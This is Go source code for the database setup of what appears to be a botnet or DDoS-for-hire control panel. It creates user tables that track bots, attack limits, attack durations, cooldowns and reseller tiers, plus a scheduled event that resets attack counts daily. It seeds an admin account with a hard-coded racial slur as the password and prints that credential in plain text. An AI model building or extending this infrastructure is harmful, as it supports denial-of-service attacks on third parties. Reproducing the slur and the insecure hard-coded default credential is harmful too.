package database

import (
	"database/sql"
	"fmt"
	"golang.org/x/crypto/bcrypt"
	"log"
	"math/rand"
)

func createTables(db *sql.DB) {
	// Check if users table exists
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users'").Scan(&count)
	if err != nil {
		log.Fatal(err)
	}

	if count > 0 {
		fmt.Println("Users table already exists. Skipping table creation.")
		return
	}

	// Create users table
	_, err = db.Exec(`
		CREATE TABLE users (
			id INT AUTO_INCREMENT PRIMARY KEY,
			username VARCHAR(255) NOT NULL,
			password VARCHAR(255) NOT NULL,
			max_bots INT NOT NULL DEFAULT -1,
			admin INT NOT NULL DEFAULT 0,
			reseller INT NOT NULL DEFAULT 0,
			superuser INT NOT NULL DEFAULT 0,
			vip INT NOT NULL DEFAULT 0,
			maxAttacks INT NOT NULL DEFAULT 100,
			totalAttacks INT NOT NULL DEFAULT 0,
			expiry INT NOT NULL,
			maxTime INT NOT NULL DEFAULT 60,
			cooldown INT NOT NULL DEFAULT 100,
			parent VARCHAR(255) NOT NULL
		);
    `)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Users table created.")

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("nigger"), bcrypt.DefaultCost)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`
		INSERT INTO users (username, password, max_bots, admin, reseller, superuser, vip, maxAttacks, totalAttacks, expiry, maxTime, cooldown, parent)
		SELECT 'admin', ?, -1, 1, 1, 1, 1, 9999, 0, UNIX_TIMESTAMP(DATE_ADD(NOW(), INTERVAL 999 DAY)), 60, 10, 'sql'
		WHERE NOT EXISTS (SELECT 1 FROM users WHERE username = 'admin');
	`, hashedPassword)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Created user %s with password %s as default credentials.\n", "admin", "nigger")
}

func createEvent(db *sql.DB) {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM information_schema.events WHERE event_schema = DATABASE() AND event_name = 'resetattacks'").Scan(&count)
	if err != nil {
		log.Fatal(err)
	}

	if count > 0 {
		fmt.Println("resetattacks event already exists. Skipping event creation.")
		return
	}

	_, err = db.Exec(`
		CREATE EVENT resetattacks
		ON SCHEDULE EVERY 1 DAY
		DO
		BEGIN
			UPDATE users SET totalAttacks = 0;
		END;
    `)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("resetattacks event created.")
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}
